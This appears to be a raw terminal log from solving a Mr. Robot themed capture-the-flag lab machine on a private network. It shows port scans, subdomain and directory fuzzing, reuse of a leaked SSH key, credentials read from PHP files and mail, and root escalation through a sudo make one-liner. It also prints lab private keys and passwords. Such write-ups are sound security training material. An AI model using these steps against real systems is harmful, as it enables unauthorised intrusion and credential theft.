┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ nmap -sn 10.0.250.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 17:16 EDT
Nmap scan report for 10.0.250.1
Host is up (0.00051s latency).
MAC Address: 08:00:27:AA:D1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.8
Host is up (0.00098s latency).
MAC Address: 08:00:27:11:2A:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.5
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.15 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ nmap -sS --min-rate 5000 -p- --open -n -Pn 10.0.250.8 -oN scan.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 17:18 EDT
Nmap scan report for 10.0.250.8
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:11:2A:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
22,2222,80
                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ nmap -p22,80,2222 -sV -sC -Pn -vvv -n -oN fullScan.txt 10.0.250.8    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 17:22 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
Initiating ARP Ping Scan at 17:22
Scanning 10.0.250.8 [1 port]
Completed ARP Ping Scan at 17:22, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:22
Scanning 10.0.250.8 [3 ports]
Discovered open port 22/tcp on 10.0.250.8
Discovered open port 80/tcp on 10.0.250.8
Discovered open port 2222/tcp on 10.0.250.8
Completed SYN Stealth Scan at 17:22, 0.02s elapsed (3 total ports)
Initiating Service scan at 17:22
Scanning 3 services on 10.0.250.8
Completed Service scan at 17:22, 6.08s elapsed (3 services on 1 host)
NSE: Script scanning 10.0.250.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
Nmap scan report for 10.0.250.8
Host is up, received arp-response (0.00040s latency).
Scanned at 2025-09-17 17:22:34 EDT for 7s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: Allsafe
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 7 (protocol 2.0)
MAC Address: 08:00:27:11:2A:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:22
Completed NSE at 17:22, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ 
-------------------------------------------------------------------------------------------------------------------------------



└─$ sudo nano /etc/hosts 
[sudo] password for kali: 
                                                                                                                                                           
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.0.250.8 allsafe.thl

-------------------------------------------------------------------------------------------------------------------------------

```bash 
wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/seclists/Discovery/DNS/subdomains-top1million-5000.txt     -H "HOST: FUZZ.allsafe.thl" -u 10.0.250.8 
```

┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/seclists/Discovery/DNS/subdomains-top1million-5000.txt     -H "HOST: FUZZ.allsafe.thl" -u 10.0.250.8 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.250.8/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000058:   302        0 L      0 W        0 Ch        "intranet - intranet"                                                                      

Total time: 6.135240
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 813.1710

                                                                                                                                                            

-------------------------------------------------------------------------------------------------------------------------------

```
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
#10.0.250.4 bloodhound.thl dc.bloodhound.thl
#10.0.250.7 adivinaadivinanza
10.0.250.8 allsafe.thl intranet.allsafe.thl
```











-----------------------------------------------------------------------------------------------------------------


(kali㉿kali)-[~/Documents/mrRobot]
└─$ wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/seclists/Discovery/DNS/subdomains-top1million-5000.txt     -H "HOST: FUZZ.allsafe.thl" -u 10.0.250.8 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.250.8/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000058:   302        0 L      0 W        0 Ch        "intranet - intranet"                                                                      


=============================================================================================================================================================================================
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ sudo nano /etc/hosts 
[sudo] password for kali: 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
#10.0.250.4 bloodhound.thl dc.bloodhound.thl
#10.0.250.7 adivinaadivinanza
10.0.250.8 allsafe.thl intranet.allsafe.thl

=============================================================================================================================================================================================


                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ gobuster dir -u http://intranet.allsafe.thl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404


/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]
/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]
/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]
/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]
/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]







=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ vim id_rsa 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ cat id_rsa    
−−−−−BEGIN OPENSSH PRIVATE KEY−−−−−
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAmGqHh2o84MpOxktbDf6ENwqdz7xQ4XqZbut/ nxIfpevyszfP0kOM
edI2pX+vZVVTzxJ3GumZYArNWeFScOI90ZCU8bylIihC0i/450XzzN86SgNkOeFIjK5uiU
78ATZwuJVqRNspyAg4qpohBt43SiJ2ILL75u5lPBzFX9rfeW9kpxU+nuR6P/wTpcqFgZWT
TuSwfEudYAmBOtG01hrfgtVZzBZ8eqNCjIZmx7HQkeny+sOMdTwkKp8PuBqMyag4E/PYFR
HF7MunDmbvh0V163FatZYQippXsr3iTt7NT0qOxqNk+kvvWWbbRGBN9VHDByyNC20Hj7W0
RALgwYDmrwAAA8gz5lrPM+ZazwAAAAdzc2gtcnNhAAABAQCYaoeHajzgyk7GS1sN/oQ3Cp
3PvFDheplu63+fEh+l6/KzN8/SQ4x50jalf69lVVPPEnca6ZlgCs1Z4VJw4j3RkJTxvKUi
KELSL/jnRfPM3zpKA2Q54UiMrm6JTvwBNnC4lWpE2ynICDiqmiEG3jdKInYgsvvm7mU8HM
Vf2t95b2SnFT6e5Ho//BOlyoWBlZNO5LB8S51gCYE60bTWGt+C1VnMFnx6o0KMhmbHsdCR
6fL6w4x1PCQqnw+4GozJqDgT89gVEcXsy6cOZu+HRXXrcVq1lhCKmleyveJO3s1PSo7Go2
T6S+9ZZttEYE31UcMHLI0LbQePtbREAuDBgOavAAAAAwEAAQAAAQA7FUi2YKN6zFHfIoUI
lrowEAh+59Q+o+Toj5foVQE5s45glOkV7CN/cdLHMwkN8hbL9a+AGj/fcDCMgAESS1GFdF
OYpfUpmYvVqM0G8iIBMCOLX2cx3Lff+RpWVezwl2b41srcKE05Ap7c22SkIe4y6cr7AAcQ
TSenNsv4TYNFsiRzVDUwISqlp3EhFWPe1GClasPahS3pEDcNiMwRh8mPt7HRG9HqLEPhWv
9qTpoCnnc30s4Wo9QipdtcxvHrrEPVVrwcz3SJnlCLTlYjiBHZ+gGBl73crSZJOlxNAiow
A85FBKi6FrWaA3WXrKdCFEh3atKGg5I8kCGhxBkpjn8ZAAAAgCo8745ADp4U7gibCuKs5N
g7JYWuJDZCYyEClHkWJYdb6CluTJx9DOw0i28Ip8FM8P0YQclTMlU21pwVj1eVXk/5D3kg
bsBO4hfcSoqewOG0H5U44aiey01z38kz0PL6Z/6JGMzEuSvlHKTJgCGaQSrFcC1X/57LOp
pViYAqrNC5AAAAgQDPNORYZS8OywkcFN2LZe3uHa4EFZPytnzcPcnQeGWwVqm/12D10vPR
yeTA0lvIKYkWcClPmiM3/CFQdWPwTyMGryyMv+5+lVJEi0dfHa02jCYKH87pVH35UF6ZPB
TgvhsrQRFX12vSk/DO30Aa15P/GT4XceHEdM6GlXkOBtILjQAAAIEAvE6vGGynNroa34mv
cuLE4hu5zK8t167MUX6zNgPDmmoUTwHIRL43ErUo+KpQf1yS3S70Q6xfTQjaxo9S5QuQMR
CsEojTarhvJ7+VxSKpjjju9Nmuxd2d2vrEPTgrOSijimjkjWK6OhZgemGoKoDUpOf2j8kv
mKzxF43kdEiETisAAAARcm9vdEAwOTk2MGRmYjE3OGUBAg==
−−−−−END OPENSSH PRIVATE KEY−−−−−
                                                                                                                                                            

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ cp id_rsa id_rsa.bak

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ perl -0777 -pe 's/\x{2212}/-/g; s/\r//g' id_rsa.bak > id_rsa.step1

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ sed -E '1,10 s/.*BEGIN OPENSSH PRIVATE KEY.*/-----BEGIN OPENSSH PRIVATE KEY-----/;
         $   s/.*END OPENSSH PRIVATE KEY.*/-----END OPENSSH PRIVATE KEY-----/' id_rsa.step1 > id_rsa.step2


                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ awk 'BEGIN{inside=0}
     /^-----BEGIN OPENSSH PRIVATE KEY-----/{print; inside=1; next}
     /^-----END OPENSSH PRIVATE KEY-----/{print; inside=0; next}
     { if(inside==1) { gsub(/ /,""); print } else print }' id_rsa.step2 > id_rsa.fixed

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ chmod 600 id_rsa.fixed

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ ssh-keygen -l -f id_rsa.fixed

2048 SHA256:TKfyAzvpDu/+rq3tLYHAMGafEdNxznqIOtlZE7wvYhg root@09960dfb178e (RSA)
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ ssh-keygen -y -f id_rsa.fixed > id_rsa.fixed.pub || true

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ ls -l id_rsa.bak id_rsa.fixed id_rsa.fixed.pub 2>/dev/null || true

-rw------- 1 kali kali 1864 Sep 18 10:53 id_rsa.bak
-rw------- 1 kali kali 1823 Sep 18 10:53 id_rsa.fixed
-rw-rw-r-- 1 kali kali  399 Sep 18 10:54 id_rsa.fixed.pub

=============================================================================================================================================================================================                                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ ssh -i id_rsa.fixed parker@10.0.250.8 -p 2222 


parker@ae3ff527ff85:~$ 
parker@ae3ff527ff85:~$ whoami
parker
parker@ae3ff527ff85:~$ pwd
/home/parker
parker@ae3ff527ff85:~$
parker@ae3ff527ff85:/var/www$ ls
allsafe  html  intranet
parker@ae3ff527ff85:/var/www$ cd allsafe/
parker@ae3ff527ff85:/var/www/allsafe$ ls
assets  contact.php  images  index.php  our-history.php  our-team.php  views
parker@ae3ff527ff85:/var/www/allsafe$ cat contact.php 
<?php

$errors = [];
$name = $email = $website = $message = "";
$msgForm = '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    
    // Validar Nombre
    if (empty($_POST["name"])) {
        $errors[] = "El nombre es obligatorio.";
    } else {
        $name = htmlspecialchars(trim($_POST["name"]));
    }

    // Validar Email
    if (empty($_POST["email"])) {
        $errors[] = "El email es obligatorio.";
    } elseif (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
        $errors[] = "Formato de email inválido.";
    } else {
        $email = htmlspecialchars(trim($_POST["email"]));
    }

    // Validar Sitio Web (opcional)
    if (!empty($_POST["website"])) {
        if (!filter_var($_POST["website"], FILTER_VALIDATE_URL)) {
            $errors[] = "La URL del sitio web no es válida.";
        } else {
            $website = htmlspecialchars(trim($_POST["website"]));
        }
    }

    // Validar Mensaje
    if (empty($_POST["message"])) {
        $errors[] = "El mensaje es obligatorio.";
    } else {
        $message = htmlspecialchars(trim($_POST["message"]));
    }

    if (empty($errors)) {        
                if ($website == 'http://localhost') {
                        $msgForm = "123456Seven"; # En este punto debería filtrarse la contraseña de Ollie Parker
                } else {
                        $msgForm = "Enviando con exito!";
                }
    }
}
=============================================================================================================================================================================================
parker@ae3ff527ff85:/var/www/allsafe$ ls
assets  contact.php  images  index.php  our-history.php  our-team.php  views
parker@ae3ff527ff85:/var/www/allsafe$ cd ..
parker@ae3ff527ff85:/var/www$ ls
allsafe  html  intranet
parker@ae3ff527ff85:/var/www$ cd intranet/
parker@ae3ff527ff85:/var/www/intranet$ ks
-bash: ks: command not found
parker@ae3ff527ff85:/var/www/intranet$ ls
assets  customers.php  db.php  docs  images  index.php  login.php  logout.php  new_customer.php  process  process_login.php  profile.php  views
parker@ae3ff527ff85:/var/www/intranet$ cat new_customer.php 
<?php
declare(strict_types=1);

session_start();

require 'db.php';

if (!isset($_SESSION['idEmployee'])) die(header('Location: login.php'));

header('Content-Type: application/json; charset=UTF-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  http_response_code(405);
  echo json_encode(['ok' => false, 'message' => 'Método no permitido']);
  exit;
}

// CSRF
if (empty($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'])) {
  http_response_code(419);
  echo json_encode(['ok' => false, 'message' => $_SESSION['csrf_token']]);
  exit;
}

// Helpers
function v($key): ?string {
  return isset($_POST[$key]) ? trim((string)$_POST[$key]) : null;
}
function respond422(array $errors): void {
  http_response_code(422);
  echo json_encode(['ok' => false, 'errors' => $errors], JSON_UNESCAPED_UNICODE);
  exit;
}

$errors = [];

// 1) Tomar entradas ya "trimmeadas"
$cliente  = v('cliente');
$empresa  = v('empresa');
$email    = v('email');
$telefono = v('telefono');
$pais     = v('pais');
$servicio = v('servicio');
$estado   = v('estado');
$alta     = v('alta');      // YYYY-MM-DD
$proxima  = v('proxima');   // YYYY-MM-DD opcional

// 2) Validaciones
// Requeridos
foreach (['cliente','empresa','email','telefono','pais','servicio','estado','alta'] as $req) {
  if (!v($req)) { $errors[$req] = 'Campo obligatorio.'; }
}

// Longitudes (hardening)
if ($cliente && mb_strlen($cliente) > 120) { $errors['cliente'] = 'Máximo 120 caracteres.'; }
if ($empresa && mb_strlen($empresa) > 120) { $errors['empresa'] = 'Máximo 120 caracteres.'; }
if ($email && mb_strlen($email) > 160) { $errors['email'] = 'Máximo 160 caracteres.'; }
if ($telefono && mb_strlen($telefono) > 40) { $errors['telefono'] = 'Máximo 40 caracteres.'; }

// Email
if ($email && !filter_var($email, FILTER_VALIDATE_EMAIL)) {
  $errors['email'] = 'Ingresa un email válido.';
}

// Teléfono (muy permisivo: dígitos, espacios, +, -, paréntesis)
if ($telefono && !preg_match('/^[0-9+\-\s().]{6,}$/', $telefono)) {
  $errors['telefono'] = 'Formato de teléfono inválido.';
}

// Selects: listas blancas
$whitelistPais = ['Alemania','Inglaterra','Francia','Estados Unidos','Italia'];
$whitelistServicio = [
  'Banco','Centro Hospitalario','Aseguradora de Salud',
  'Mutua Sanitaria', 'Red de Hospitales',
  'Fintech Bancaria','Procesador de Pagos',
  'Clínica Privada', 'Finanzas'
];
$whitelistEstado = ['Activo','En proceso','Alerta','Standby'];

if ($pais && !in_array($pais, $whitelistPais, true)) { $errors['pais'] = 'País inválido.'; }
if ($servicio && !in_array($servicio, $whitelistServicio, true)) { $errors['servicio'] = 'Servicio inválido.'; }
if ($estado && !in_array($estado, $whitelistEstado, true))  { $errors['estado'] = 'Estado inválido.'; }

// Fechas (YYYY-MM-DD) y lógica de negocio
function parseDate(string $d): ?DateTimeImmutable {
  $dt = DateTimeImmutable::createFromFormat('Y-m-d', $d);
  $err = DateTimeImmutable::getLastErrors();
  return ($dt && empty($err['warning_count']) && empty($err['error_count'])) ? $dt : null;
}

$altaDt = $alta ? parseDate($alta) : null;
if ($alta && !$altaDt) { $errors['alta'] = 'Fecha de alta inválida (YYYY-MM-DD).'; }

$proximaDt = $proxima ? parseDate($proxima) : null;
if ($proxima && !$proximaDt) { $errors['proxima'] = 'Fecha de revisión inválida (YYYY-MM-DD).'; }

// Próxima revisión debe ser >= alta (si la envían)
if ($altaDt && $proximaDt && $proximaDt < $altaDt) {
  $errors['proxima'] = 'La revisión debe ser igual o posterior a la fecha de alta.';
}

// Salir si hay errores
if ($errors) { respond422($errors); }

// 3) Normalización/saneamiento simple antes de persistir
$cliente  = mb_substr($cliente, 0, 120);
$empresa  = mb_substr($empresa, 0, 120);
$email    = mb_strtolower($email);
$telefono = preg_replace('/\s+/', ' ', $telefono);

try {
  $stmt = $pdo->prepare('INSERT INTO customer_accounts (company, customer_name, customer_email, phone_number, country, service, status, created_at, next_review)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)');
  $stmt->execute([$cliente, $empresa, $email, $telefono, $pais, $servicio, $estado, $alta, $proxima ?: null]);
} catch (Throwable $e) {
  http_response_code(500);
  echo json_encode(['ok' => false, 'message' => 'Error interno.'], JSON_UNESCAPED_UNICODE);
  exit;
}

die(json_encode([
  'ok' => true,
  'message' => 'Cliente guardado correctamente.',
  'data' => [
    'cliente' => $cliente,
    'empresa' => $empresa,
    'email' => $email,
    'telefono' => $telefono,
    'pais' => $pais,
    'servicio' => $servicio,
    'estado' => $estado,
    'alta' => $alta,
    'proxima' => $proxima ?: null
  ]
], JSON_UNESCAPED_UNICODE));
parker@ae3ff527ff85:/var/www/intranet$ ls
assets  customers.php  db.php  docs  images  index.php  login.php  logout.php  new_customer.php  process  process_login.php  profile.php  views
parker@ae3ff527ff85:/var/www/intranet$ cat db.php 
<?php

$dsn = "mysql:host=db;dbname=allsafe;charset=utf8";
$username = "root";
$password = "31jB2rcbG1Pjorbd93eaxHW";

try {
    $pdo = new PDO($dsn, $username,  $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOExecption) {
    die("Connection failed: " . $e->getMessage());
}

=============================================================================================================================================================================================

parker@ae3ff527ff85:/var$ cd mail/
parker@ae3ff527ff85:/var/mail$ ls
parker
parker@ae3ff527ff85:/var/mail$ ls -l
total 4
drwxr-sr-x 2 parker parker 4096 Aug 24 18:39 parker
parker@ae3ff527ff85:/var/mail$ cd parker/
parker@ae3ff527ff85:/var/mail/parker$ ls
meeting

parker@ae3ff527ff85:/var/mail/parker$ cat meeting 
From goddard@localhost Thu Aug 21 14:05:20 2025
Date: Thu, 21 Aug 2025 14:05:20 +0000
From: goddard@localhost
To: parker@localhost
Subject: Reunión con E-Corp
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY"

--BOUNDARY
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hola Oliver,

Te adjunto las notas que armé para la reunión con el cliente.  
Revisalo y confirmame si llegamos con todo.

Saludos,  
Gideon

--BOUNDARY
Content-Type: text/plain; name="meeting_notes.txt"
Content-Disposition: attachment; filename="meeting_notes.txt"
Content-Transfer-Encoding: 7bit

Meeting Notes - E-Corp
----------------------
1. Confirmar agenda con el cliente.
2. Revisar documentación técnica.
3. Validar acceso al portal con la credencial:

   Clave de acceso: 6D7033386E71556654416130494D314F70306157

4. Preparar demo corta del servicio.
--BOUNDARY--
EOF.

=============================================================================================================================================================================================

parker@ae3ff527ff85:/var/mail/parker$ /etc/passwd
goddard:x:1000:1000::/home/goddard:/bin/bash
parker:x:1001:1001::/home/parker:/bin/bash


┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ python3 gohash.py                                         

                                                                                                                                                            
     ██████╗  ██████╗       ██╗  ██╗ █████╗ ███████╗██╗  ██╗                                                                                                
    ██╔════╝ ██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║  ██║                                                                                                
    ██║  ███╗██║   ██║█████╗███████║███████║███████╗███████║                                                                                                
    ██║   ██║██║   ██║╚════╝██╔══██║██╔══██║╚════██║██╔══██║                                                                                                
    ╚██████╔╝╚██████╔╝      ██║  ██║██║  ██║███████║██║  ██║                                                                                                
     ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                                
            <<------ C O D E   B Y   H U N X ------>>                                                                                                       
                       < Hash identified >                                                                                                                  
                                                                                                                                                            
  [+] Enter Your Hash : 6D7033386E71556654416130494D314F70306157                                                                                            
                                                                                                                                                            
  ===================== Show Algorithm Hash ====================                                                                                            
                                                                                                                                                            
  [+] Hash : 6D7033386E71556654416130494D314F70306157                                                                                                       
  [+] Algorithm : SHA1, MySQL4.1/MySQL5, Hex encoded string                                                                                                 
                                                                                                                                                            
  ==============================================================                                                                                            
                                                                                                                                                            
  Do you want to identify the hash again? Y/N : Y                                                                                                           
                                                                                                                                                            
  [+] Enter Your Hash : 6D7033386E71556654416130494D314F70306157                                                                                            
                                                                                                                                                            
  ===================== Show Algorithm Hash ====================                                                                                            
                                                                                                                                                            
  [+] Hash : 6D7033386E71556654416130494D314F70306157                                                                                                       
  [+] Algorithm : SHA1, MySQL4.1/MySQL5, Hex encoded string                                                                                                 
                                                                                                                                                            
  ==============================================================                                                                                            
                                                                                                                                                            
  Do you want to identify the hash again? Y/N : N                                                                                                           
  Exit ToolS !!!                                                                                                                                            
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo -n "6D7033386E71556654416130494D314F70306157" | xxd -r -p
mp38nqUfTAa0IM1Op0aW   


=============================================================================================================================================================================================


parker@ae3ff527ff85:/var/mail/parker$ su goddard
Password: mp38nqUfTAa0IM1Op0aW




=============================================================================================================================================================================================


goddard@ae3ff527ff85:~$ sudo -l
Matching Defaults entries for goddard on ae3ff527ff85:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User goddard may run the following commands on ae3ff527ff85:
    (ALL) NOPASSWD: /usr/bin/make
goddard@ae3ff527ff85:~$ Read from remote host 10.0.250.8: Connection reset by peer
Connection to 10.0.250.8 closed.
client_loop: send disconnect: Broken pipe
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ ssh -i id_rsa.fixed parker@10.0.250.8 -p 2222
Last login: Wed Sep 17 23:09:23 2025 from 10.0.250.1

goddard@ae3ff527ff85:/home/parker$ COMMAND='/bin/sh'
goddard@ae3ff527ff85:/home/parker$ sudo make -s --eval=$'x:\n\t-'"/bin/sh"
# whoami
root
# pwd
/home/parker
# cd /root
# ls
secrets.psafe3


=============================================================================================================================================================================================

# cat secrets.psafe3 | base64 
UFdTM8LJOZRRM++jaGvMX3XV23zTzeze15pTTKY6DHX6rhVjAAAEAG2E4+iaIvmbRLWnfBO7BayR
f96DPQ6ZeeUGw5Ge/aymBrgOdsChrqTxvYPEsVUZBCnJu3kbz8QgO172l5nzKRNr2wDmYilWuCBx
92EcjHXYEg7cLtUyXTPOcCV4qE6153Xj9IZyMqUZFNaoTb8jVyxNNn+e4qihS5a2dRV8oYesucV4
Ep1mgUc36tdw1pMUOg7PQJZnM6hzysRRkppkoqZBInGfQOAB2KPQTneMOaacs/l1PRU/7GbfRIXO
ZcxqCyDAd05VSXpfTpjjcTw6pHFKChWx0SXvyBMsMnJ7NmYkqmG/4avb6SuImc5BnVIQMxfL5atz
WC/E4tMn8NZTgsHrRz0++wFhkAawNHng0SoOAnwEyzcRb8F6QQLqdISFr+/sIXxKqoyaA9b9BoVE
ikllAO8N+bhWE5Ir+3YrDkNbGH/63l/lNpxkp3Ij+3owcAFpwcxP/u5Annl9PmBeEovvtJLfJQP8
23mHCbfrbGNHoAmPejN38OH4gl7i4Yby3NT1Jh1l2pf/InWt0aAEQV/N1LvmdLDxnWsK2SWJ8z1J
w+iXwqc/HKm8TqYZK46CsRIqDpp8v43lg/nxo/gdz2mjAgfe+AOosMItXa95OZNk4/TxVCQ/JC//
Rbv5Ht9RHMb2yz9txMbA5U1xVzYiQbbndeOio2p2TyR1V7LUC6UwHUavIXJmNNK+i01WQOmkNoWN
CdnioPg/6Is6CtqNgQASZ3XaVZypZJU/nBLcw6uJpkM91VXFhykH9rnmPwcXtgIreBAFn80YFzzp
O0d9F9bpP9Esec61LeFLoVg2/8ucsbr281qTxtI/xZw+oXrM8jbaV4UQl/GGOtg/4QGmdVHdCQ1D
Qg6cGq0PBXtAQBPuOlqmPRFZRYWOBbINeWdPDX0QySQoHtbDfWwZtwtCfRI9h7px0TqqAa4f2rq6
8xHhcEfB632UBKzmHwR20FpOXZESUQ7fTgMibqLkBqiq/GzzhVHceBQU9j6mdHV7Sma+HBE6Lrfc
H12Xk6xygt/Wblu0md4Bh2xn3fPe5RUrGO0JelYhlnNVV5vYDPS9f7S2k+YyJ3XOI9awnHAWChc+
nmrqvSr0bsp2WAUuF2fD9XTTj7IItHbKS8t3yVwA2KnHi2WFz30OLgpJPLpUC82KShiEAeNr50cc
TAQDfMV3UZK6zVKKL7tZ2rKt1e2n4goSQGgoo3oORdlaFrCSti5Ig16u8pRiXHERlTQMFswX0oRC
BfBAYhO+LGAxX/4Ciy2G3oGHUhh8bW3gccNKuiiadCJVfzegE2KvQCBpzaLnm7EyfHzadwrATJqv
RBB8hhaZ3P0BgjKqUC+uFNR8c28ap4mY8iWFiqzlTAROm3lc0xHQ2hC6NcY1Z4OtljFYX9bwWDw0
lQuMpJFHLhB15EtZiyG6UrxG/rgeICdSCnU45oLhB9ZF8m96POl0imQqYJwlD66yDcwG8yjHwgV0
kEFncZAr2f2eXDX694pHrAPsUpV/BPlNdOwP6/hrRnTDA0GaijRWwyjnWPk/RsLMjY6NoxsjTM1L
